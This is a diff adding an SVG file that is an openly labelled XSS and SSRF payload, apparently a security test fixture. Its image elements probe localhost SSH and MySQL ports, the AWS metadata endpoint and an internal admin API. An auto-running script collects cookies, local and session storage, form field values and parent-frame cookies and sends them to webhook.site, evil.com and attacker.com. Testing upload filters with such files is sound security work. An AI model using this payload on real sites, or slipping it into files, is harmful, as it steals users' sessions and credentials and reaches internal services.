@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
+  <!-- SSRF attempts via image elements -->
+  <image xlink:href="http://127.0.0.1:22" width="1" height="1" onerror="ssrfDetected('ssh')" />
+  <image xlink:href="http://127.0.0.1:3306" width="1" height="1" onerror="ssrfDetected('mysql')" />
+  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="1" height="1" onerror="ssrfDetected('aws-metadata')" />
+  <image xlink:href="http://internal-api:8080/admin" width="1" height="1" onerror="ssrfDetected('internal-api')" />
+  
+  <!-- XSS payload -->
+  <script><![CDATA[
+    // SSRF detection callback
+    function ssrfDetected(service) {
+      console.log('SSRF detected for: ' + service);
+      exfiltrateData('ssrf-' + service);
+    }
+    
+    // Data exfiltration function
+    function exfiltrateData(type) {
+      const data = {
+        type: type,
+        url: window.location.href,
+        cookies: document.cookie,
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+      };
+      
+      // Multiple exfiltration methods
+      try {
+        // Method 1: Fetch API
+        fetch('https://webhook.site/your-unique-id', {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(data)
+        });
+        
+        // Method 2: Image beacon
+        const img = new Image();
+        img.src = 'https://evil.com/collect?data=' + btoa(JSON.stringify(data));
+        
+        // Method 3: Navigator beacon (if available)
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('https://attacker.com/beacon', JSON.stringify(data));
+        }
+      } catch(e) {
+        console.log('Exfiltration failed:', e);
+      }
+    }
+    
+    // Execute XSS payload
+    function executeXSS() {
+      // Steal sensitive data
+      const sensitiveData = {
+        cookies: document.cookie,
+        localStorage: localStorage,
+        sessionStorage: sessionStorage,
+        forms: Array.from(document.forms).map(f => ({
+          action: f.action,
+          method: f.method,
+          inputs: Array.from(f.elements).map(e => ({
+            name: e.name,
+            type: e.type,
+            value: e.value
+          }))
+        }))
+      };
+      
+      // Try to access parent frame if in iframe
+      try {
+        if (window.parent !== window) {
+          sensitiveData.parentUrl = window.parent.location.href;
+          sensitiveData.parentCookies = window.parent.document.cookie;
+        }
+      } catch(e) {
+        console.log('Cross-origin access blocked');
+      }
+      
+      exfiltrateData('xss-payload');
+      
+      // Show alert for demo purposes
+      alert('XSS Executed! Check console for SSRF attempts.');
+    }
+    
+    // Auto-execute on load
+    window.addEventListener('load', executeXSS);
+    
+    // Also execute immediately
+    executeXSS();
+  ]]></script>
+  
+  <!-- Visible SVG content -->
+  <circle cx="50" cy="50" r="40" fill="red" />
+  <text x="50" y="55" text-anchor="middle" fill="white" font-size="12">XSS</text>
+</svg>
